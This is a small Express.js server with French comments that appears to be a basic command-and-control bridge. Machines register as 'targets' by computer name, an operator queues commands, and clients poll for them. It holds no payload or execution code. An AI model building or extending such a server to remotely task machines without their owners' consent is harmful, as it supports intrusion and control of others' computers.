const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();

const dataFilePath = path.join(__dirname, 'data/data.json');

app.use(express.json());

// Fonction pour lire le contenu de cibles.json
const readData = () => {
    try {
        const data = fs.readFileSync(dataFilePath, 'utf-8');
        return JSON.parse(data);
    } catch (err) {
        console.error("Erreur lors de la lecture du fichier:", err);
        return { cibleList: [], commandes: [] };
    }
};

// Fonction pour écrire dans cibles.json
const writeData = (data) => {
    try {
        fs.writeFileSync(dataFilePath, JSON.stringify(data, null, 2));
    } catch (err) {
        console.error("Erreur lors de l'écriture dans le fichier:", err);
    }
};

// Endpoint de base
app.get('/', (req, res) => {
    res.send({ message: 'Bridge Com !' });
});

// Récupération de la liste des cibles
app.get('/cibles', (req, res) => {
    const data = readData();
    res.json({ cibleList: data.cibleList });
});

// Récupération de la liste des commandes
app.get('/commandes', (req, res) => {
    const data = readData();
    res.json({ commandes: data.commandes });
});

// Ajout d'un nom d'ordinateur
app.post('/identify', (req, res) => {
    const { computer_name = 'Unknown' } = req.body;
    const data = readData();
    data.cibleList.push(computer_name);
    writeData(data);
    res.json({ message: `Request from computer: ${computer_name}`, cibleList: data.cibleList });
});

// Ajout d'une commande
app.post('/commande', (req, res) => {
    const { commande } = req.body;
    if (!commande) {
        return res.status(400).json({ message: "Commande est requise." });
    }
    const data = readData();
    data.commandes.push(commande);
    writeData(data);
    res.json({ message: `Commande ajoutée: ${commande}`, commandes: data.commandes });
});


// recuperation  d'une commande
app.post('/getCommande', (req, res) => {
    const { info } = req.body;
    const data = readData();
    const commandes = data.commandes
    const isExist = commandes.filter((cible)=>
        cible == info
    )

    console.log(isExist.length)

    if(isExist.length > 0){
        res.json({ commande: data.commandes});
    }else {
        res.json({ message: 'Aucune nouveau commande'});
    }
});

const PORT = 5000;

app.listen(PORT, () => console.log(`🚀 @ http://localhost:${PORT}`));
